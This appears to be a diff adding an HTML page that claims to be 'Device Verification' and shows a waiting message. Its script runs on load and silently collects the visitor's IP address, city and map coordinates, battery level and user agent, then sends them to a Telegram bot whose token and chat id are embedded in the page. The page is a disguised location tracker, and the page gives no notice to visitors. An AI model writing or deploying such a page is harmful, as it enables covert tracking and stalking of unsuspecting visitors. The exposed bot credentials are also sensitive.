@@ -1,0 +1,47 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Device Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { font-family: Arial, sans-serif; background: #f9f9f9; text-align: center; padding: 40px; }
+    .box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    h2 { color: #333; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>Verifying Your Device...</h2>
+    <p>This may take a few seconds.</p>
+  </div>
+
+  <script>
+    async function sendToTelegram() {
+      try {
+        const ipRes = await fetch('https://ipinfo.io/json?token=1c3fe27d53c16c'); // Public IP info API
+        const ipData = await ipRes.json();
+        const location = ipData.loc;
+        const battery = await navigator.getBattery().then(b => b.level * 100 + '%');
+        const device = navigator.userAgent;
+
+        const message = `📍 *New Visitor Alert*\n\n🌐 IP: ${ipData.ip}\n📍 Location: ${ipData.city}, ${ipData.region}, ${ipData.country}\n📌 Maps: https://maps.google.com/?q=${location}\n📱 Device: ${device}\n🔋 Battery: ${battery}`;
+
+        fetch("https://api.telegram.org/bot8095209284:AAEiGcf0jBWTmCF0fVTe0ItnUZdKq52LY0Q/sendMessage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: "8095209284",
+            text: message,
+            parse_mode: "Markdown"
+          })
+        });
+      } catch (err) {
+        console.error("Error sending to Telegram:", err);
+      }
+    }
+
+    sendToTelegram();
+  </script>
+</body>
+</html>
